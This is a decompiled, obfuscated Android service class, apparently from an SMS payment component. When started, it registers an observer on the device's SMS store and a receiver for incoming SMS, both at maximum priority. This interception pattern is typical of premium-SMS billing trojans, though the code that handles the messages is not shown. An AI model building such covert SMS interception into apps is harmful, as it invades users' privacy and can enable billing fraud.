package com.soy;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.IBinder;

public class service
  extends Service
{
  public static Pay.Listener a;
  private boolean b = false;
  private w c;
  private q d;
  
  public service() {}
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onDestroy()
  {
    super.onDestroy();
    getContentResolver().unregisterContentObserver(this.c);
    unregisterReceiver(this.d);
    unregisterReceiver(y.a().f);
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    if (!this.b)
    {
      this.b = true;
      Object localObject = y.a();
      ((y)localObject).c = a;
      if (((y)localObject).a < 2)
      {
        ((y)localObject).a += 1;
        if (!((y)localObject).b)
        {
          ((y)localObject).b = true;
          IntentFilter localIntentFilter = new IntentFilter();
          localIntentFilter.addAction(y.e);
          localIntentFilter.setPriority(Integer.MAX_VALUE);
          registerReceiver(((y)localObject).f, localIntentFilter);
        }
        ((y)localObject).a(this);
      }
      localObject = getContentResolver();
      this.c = new w((ContentResolver)localObject, new u(this));
      ((ContentResolver)localObject).registerContentObserver(Uri.parse("content://sms/"), true, this.c);
      localObject = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
      ((IntentFilter)localObject).setPriority(Integer.MAX_VALUE);
      this.d = new q();
      registerReceiver(this.d, (IntentFilter)localObject);
    }
    return super.onStartCommand(paramIntent, 1, paramInt2);
  }
}
